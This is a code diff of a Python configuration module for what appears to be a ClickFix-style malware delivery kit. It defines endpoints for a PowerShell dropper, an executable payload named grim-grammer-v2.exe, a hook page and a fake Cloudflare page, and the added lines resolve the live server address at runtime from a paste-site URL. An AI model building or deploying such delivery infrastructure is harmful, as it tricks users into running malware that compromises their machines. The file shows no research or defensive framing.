@@ -1,18 +1,29 @@
 import os
+import requests
 
 
-isDP = os.environ.get("IS_DEPLOYED","NOPE")
+#Main Condition
+isDeployed = os.environ.get("IS_DEPLOYED","NOPE") == "YEP"
 
-isDeployed = lambda is_deployed:True if is_deployed=='YEP' else False
-
+#Static Mere Configs
 socialENGServerFile = "pagesServer.py"
 fielServerFile = "filesServer.py"
-slash = "/" if isDeployed(isDP) else "\\"
+slash = "/" if isDeployed else "\\"
 
 
 
-proto = lambda is_deployed:'https://' if is_deployed=="YEP" else 'http://'
+#lambda getters
+getDeployedHost = lambda _0_X_0_ST_url:requests.get(_0_X_0_ST_url).text.split("=")
+setDeployedHost = lambda host :host[1]
+DeployedPort = lambda:os.environ["PORT"]
 
+#URI Building
+proto = 'https://' if isDeployed else 'http://'
+port = "443" if isDeployed else "80"
+host = "localhost" if not isDeployed else setDeployedHost(getDeployedHost(_0_X_0_ST_url="https://0x0.st/Piqn.txt"))
+deliveryServerPort = "10000"
+
+#Endpoints and FILEPATHS
 hookPageEndpoint = "/45f95d55-8681-46b0-8afa-6d87b02e01dc"
 binName = "grim-grammer-v2.exe"
 binEndpoint = "/grim-grammer-v2.exe"
@@ -21,16 +32,15 @@ dropperName = "test.ps1"
 payloadFolder = f".{slash}bin{slash}" 
 staticFolder = f".{slash}static{slash}"
 
-port = "443" if isDeployed(isDP) else "80"
-host = "localhost" if not isDeployed(isDP) else "UNSETTLED"
-deliveryServerPort = "10000"
-DeployedPort = lambda:os.environ["PORT"]
 
+
+
+#CONVININCE WRAPPERs
 conf = {
     "URLS":{
-        "powershell_dropper_url":f"{proto(isDP)}{host}:{deliveryServerPort}{dropperEndpoint}",
-        "actual_binary_payload":f"{proto(isDP)}{host}:{deliveryServerPort}{binEndpoint}",
-        "clickfix_page_endpoint":f"{proto(isDP)}{host}{hookPageEndpoint}"
+        "powershell_dropper_url":f"{proto}{host}:{deliveryServerPort}{dropperEndpoint}",
+        "actual_binary_payload":f"{proto}{host}:{deliveryServerPort}{binEndpoint}",
+        "clickfix_page_endpoint":f"{proto}{host}{hookPageEndpoint}"
     },
     "PATHS":{
         "cloudflare_page":f"{staticFolder}cloudflare.html",
